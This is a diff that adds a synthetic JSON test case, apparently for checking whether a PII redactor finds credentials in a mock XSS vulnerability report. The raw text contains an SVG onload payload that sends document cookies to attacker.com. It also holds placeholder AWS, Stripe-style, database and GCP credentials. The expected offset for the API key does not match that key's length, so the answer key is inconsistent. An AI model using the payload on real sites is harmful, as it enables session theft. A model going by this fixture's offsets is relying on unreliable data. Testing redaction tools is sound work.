@@ -1,0 +1,59 @@
+{
+  "id": "synthetic_005",
+  "source": "synthetic",
+  "category": "xss",
+  "raw_text": "SVG-based XSS via File Upload - Markdown Table Analysis\n\nSVG file upload vulnerability discovered in /files/upload endpoint.\nMalicious SVG file containing embedded JavaScript was successfully uploaded and executed.\n\nAttack payload (SVG):\n<svg onload=\"fetch('https://attacker.com?token=' + document.cookie)\">\n\nVulnerability tested by security team on 2024-05-20.\nTest environment credentials:\n| Field | Value |\n|-------|-------|\n| Access Key | AKIAIOSFODNN7EXAMPLE |\n| Email | security@acmecorp.com |\n| Token | sk_sk_test_SYNTHETIC_ONLY_00001_4eC39HqLyjWDarhtTX7YEXAMPLE |\n| Internal API | api.staging.local |\n\nTesting IP address: 10.20.30.40\nDatabase connection string used: mysql://admin:DbPass789@mysql-prod.internal:3306/app_db\nGCP authentication token retrieved: ya29.a0AfH6SMBz_newtoken_example\n",
+  "expected_entities": [
+    {
+      "type": "AWS_ACCESS_KEY",
+      "value": "AKIAIOSFODNN7EXAMPLE",
+      "start": 443,
+      "end": 463,
+      "confidence_min": 0.95
+    },
+    {
+      "type": "EMAIL_ADDRESS",
+      "value": "security@acmecorp.com",
+      "start": 476,
+      "end": 497,
+      "confidence_min": 0.93
+    },
+    {
+      "type": "API_KEY",
+      "value": "sk_sk_test_SYNTHETIC_ONLY_00001_4eC39HqLyjWDarhtTX7YEXAMPLE",
+      "start": 510,
+      "end": 545,
+      "confidence_min": 0.88
+    },
+    {
+      "type": "DOMAIN",
+      "value": "api.staging.local",
+      "start": 565,
+      "end": 582,
+      "confidence_min": 0.85
+    },
+    {
+      "type": "IP_ADDRESS",
+      "value": "10.20.30.40",
+      "start": 606,
+      "end": 617,
+      "confidence_min": 0.91
+    },
+    {
+      "type": "DB_CONNECTION",
+      "value": "mysql://admin:DbPass789@mysql-prod.internal:3306/app_db",
+      "start": 651,
+      "end": 706,
+      "confidence_min": 0.89
+    },
+    {
+      "type": "AUTH_TOKEN",
+      "value": "ya29.a0AfH6SMBz_newtoken_example",
+      "start": 743,
+      "end": 775,
+      "confidence_min": 0.87
+    }
+  ],
+  "expected_redacted_text": "SVG-based XSS via File Upload - Markdown Table Analysis\n\nSVG file upload vulnerability discovered in /files/upload endpoint.\nMalicious SVG file containing embedded JavaScript was successfully uploaded and executed.\n\nAttack payload (SVG):\n<svg onload=\"fetch('https://attacker.com?token=' + document.cookie)\">\n\nVulnerability tested by security team on 2024-05-20.\nTest environment credentials:\n| Field | Value |\n|-------|-------|\n| Access Key | [AWS_ACCESS_KEY] |\n| Email | [EMAIL_ADDRESS] |\n| Token | [API_KEY] |\n| Internal API | [DOMAIN] |\n\nTesting IP address: [IP_ADDRESS]\nDatabase connection string used: [DB_CONNECTION]\nGCP authentication token retrieved: [AUTH_TOKEN]\n",
+  "adversarial_notes": "SVG-based XSS with markdown table containing credentials. Tests Presidio's ability to extract PII from structured markdown tables. 7 PII entities including MySQL connection string, Stripe API key, and GCP token."
+}
